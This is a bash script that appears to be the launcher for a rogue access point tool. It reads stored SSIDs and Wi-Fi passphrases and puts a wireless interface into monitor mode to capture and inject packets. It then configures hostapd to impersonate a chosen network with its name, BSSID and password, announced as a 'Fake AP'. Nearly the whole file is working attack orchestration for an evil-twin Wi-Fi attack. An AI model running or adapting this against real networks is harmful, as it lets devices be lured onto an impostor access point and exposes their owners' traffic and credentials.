### Main script that will launch all the necessary processes and configurations for the correct functioning of the tool ###
#! /bin/bash

if [ $# -lt 2 ]
then
    echo "The number of arguments is invalid. You need to specify two Interface names, one for AP and other connected to internet."
    echo "The following are available WIFI interfaces. Be sure you choose one that supports monitor mode."
    iw dev | grep Interface | awk '{print $2}'
    exit
fi

redes_disponibles=$(python3 extract_info.py)
interfaz=$1
hostapd_conf_file="/etc/hostapd/hostapd.conf"

separador="---------------------------\n"

SSIDs=()
BSSIDs=()
PSKs=()
contador=0
mac_actual=$(ip a | grep -i $interfaz -A 1 | grep "link" | awk '{print $2}')
sub_mac="${mac_actual:0:14}"

echo "Available SSIDs: "
while IFS= read -r red; do
    SSID=$(echo "$red" | grep -o '\bSSID: [^,]*' | cut -d ' ' -f 2-)
    BSSID=$(echo "$red" | grep -o '\bBSSID: [^,]*' | cut -d ' ' -f 2-)
    PSK=$(echo "$red" | grep -o '\bPSK: .*' | cut -d ' ' -f 2-)

    if [ "$BSSID" = "no_stored" ]
    then
        # This way, it is possible to unambiguously associate each MAC address with a specific SSID
        BSSID=$(printf "%s:%02x" "$sub_mac" $contador)
    fi

    # Store data in arrays.
    SSIDs+=("$SSID")
    BSSIDs+=("$BSSID")
    PSKs+=("$PSK")
    ((contador++))

    echo $SSID
done <<< "$redes_disponibles"

echo -e $separador

while true; do
    read -p  "Start network scan?[Y/N] " opcion

    case $opcion in
        [Yy]* )
            # Switching to monitor mode.
            nmcli device set $interfaz managed no
            ip link set $interfaz down
            iwconfig $interfaz mode monitor
            ip link set $interfaz up

            # The log file and data collection are initialized.
            rm responses.log 2>/dev/null
            rm results.txt 2>/dev/null

            # main.py is executed to start the packet capture/injection process
            python3 main.py $interfaz "${SSIDs[@]}" "${BSSIDs[@]}"

            # Only unique entries are saved.
            sort responses.log | uniq > results.txt 2>/dev/null

            # Disabling monitor mode
            ip link set $interfaz down
            iwconfig $interfaz mode manage
            nmcli device set $interfaz managed yes
            ip link set $interfaz up

            echo "SSIDs search process finishid, you can see all coincidences in results.txt file. Also you can see all responses in responses.log file"
            break
            ;;
        [Nn]* )
            break
            ;;
        * )
            echo "Type Y/y to scan or N/n to continue"
            ;;
    esac
done

echo -e $separador

read -p "Choose SSID to spoof: " SSID_elegido

N_SSID_elegido=-1

for i in "${!SSIDs[@]}"; do
    if [[ "${SSIDs[$i]}" == "$SSID_elegido" ]]; then
        N_SSID_elegido=$i
        break
    fi
done

if [ $N_SSID_elegido -eq -1 ]
then
    echo "SSID not available"
    exit
fi

# Hostapd configuration
cp "hostapd_conf.txt" "$hostapd_conf_file"

sed -i "s/^interface=XXXXXX/interface=$1/" "$hostapd_conf_file"
sed -i "s/^ssid=XXXXXX/ssid=${SSIDs[$N_SSID_elegido]}/" "$hostapd_conf_file"
sed -i "s/^wpa_passphrase=XXXXXX/wpa_passphrase=${PSKs[$N_SSID_elegido]}/" "$hostapd_conf_file"
sed -i "s/^bssid=XXXXXX/bssid=${BSSIDs[$N_SSID_elegido]}/" "$hostapd_conf_file"

# The AP is initialized
bash start_services.bash $1 $2

echo "Fake AP created and runnning."

read -p "Press any key to stop the AP and revert changes."

bash stop_services.bash $1 $2

echo "Process finished."

## END ##

